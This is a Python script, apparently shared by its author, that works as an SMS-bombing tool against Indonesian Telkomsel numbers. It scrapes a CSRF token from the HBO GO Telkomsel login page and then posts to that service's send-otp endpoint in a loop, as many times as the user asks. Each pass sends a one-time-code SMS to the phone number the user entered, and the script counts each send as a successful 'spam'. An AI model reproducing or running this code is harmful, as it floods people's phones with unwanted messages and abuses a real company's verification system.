import requests
import json
import os
import sys
import time
import random
from colorama import init
from colorama import Fore, Back, Style
from getpass import getpass
from bs4 import BeautifulSoup
import schedule

#! COLOR ANSI
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BOLD = '\033[1m'
RESET = '\033[0m'
k = 0
Berhasil = '\u2713'
Gagal = '\u2717'

#! AUTO TYPING


def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


#! RANDOM COLOR
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW,
          Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
selected_color = random.choice(colors)

#! Get_Token


def get_csrf_token(url):
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
        return csrf_token
    else:
        print('Permintaan tidak berhasil. Kode status:', response.status_code)
        return None


url = 'https://hbounify-prod.evergent.com/telkomsel/login'
csrf_token = get_csrf_token(url)

os.system("cls")
#! LOGO
print("\033[37;1m  ╔═════════════════════════════════════════════╗")
print(" \033[37;1m ║  \033[32;1m [•] Authour  : Ismail Djaini             \033[37;1m ║")
print("  \033[37;1m║  \033[32;1m [•] GitHub   : https:github.com/i-djaini \033[37;1m ║")
print("  \033[37;1m║  \033[32;1m [•] Intgram  : i_djaini                  \033[37;1m ║")
print("\033[37;1m  ╚═════════════════════════════════════════════╝")

#! INPUT
mengetik("\033[1;37m    <════════════[\033[1;33;41m • \033[1;37m Input  \033[1;33m• \033[0m\033[1;37m]══════════════>")
nomer = input(RED+BOLD+"      (•) "+WHITE+"No Khusus Tsel " +
              RED+"(08xx)"+WHITE+" > "+RESET+GREEN)
jumlah = int(input(RED+BOLD+"      (•) "+WHITE+"Jumlah Spam " +
             RED+"(Unlimtd) "+WHITE+"> "+RESET+GREEN))

#! PROGRAM
os.system("cls")
art = '''
  ___                    _  _ ___  ___       ___  ___  
 / __|_ __  __ _ _ __   | || | _ )/ _ \ ___ / __|/ _ \ 
 \__ \ '_ \/ _` | '  \  | __ | _ \ (_) |___| (_ | (_) |
 |___/ .__/\__,_|_|_|_| |_||_|___/\___/     \___|\___/ 
     |_|\033[1;93mBy \033[1;97m\033[3mIsmail Djaini
 ______________________________________________________
 '''
print(BOLD, selected_color, art, RESET)
for i in range(jumlah):
    pos = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp", headers={'Host': 'hbounify-prod.evergent.com', 'content-length': '268', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'accept': 'application/json, text/plain, */*', 'content-type': 'application/json;charset=UTF-8', 'dnt': '1', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'origin': 'https://hbounify-prod.evergent.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
                        'referer': 'https://hbounify-prod.evergent.com/telkomsel/login?operator=Telkomsel_HBO&channelPartnerID=HBO_D2C_ID&country=ID&deviceName=Linux+armv8l&deviceType=COMP&appType=Web&modelNo=20030107&serialNo=1553656907&sessionToken=4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E&territory=IDN&lang=en&returnURL=https%3A%2F%2Fwww.hbogoasia.id%2Fbilling&flow=native', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6'}, data=json.dumps({"mobile_number": nomer, "sessionToken": "4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E", "channelPartnerID": "HBO_D2C_ID", "territory": "IDN", "lang": "en", "_token": csrf_token})).text
    if "1" in pos:
        k += 1
        time.sleep(0.9)
        mengetik(
            f"{GREEN}{BOLD}   ({Berhasil}){WHITE} SPAM HBO-GO Berhasil {YELLOW}({k})")
    else:
        mengetik(
            f"{RED}{BOLD}   ({Gagal}){WHITE} SPAM HBO-GO Gagal {YELLOW}({k})")
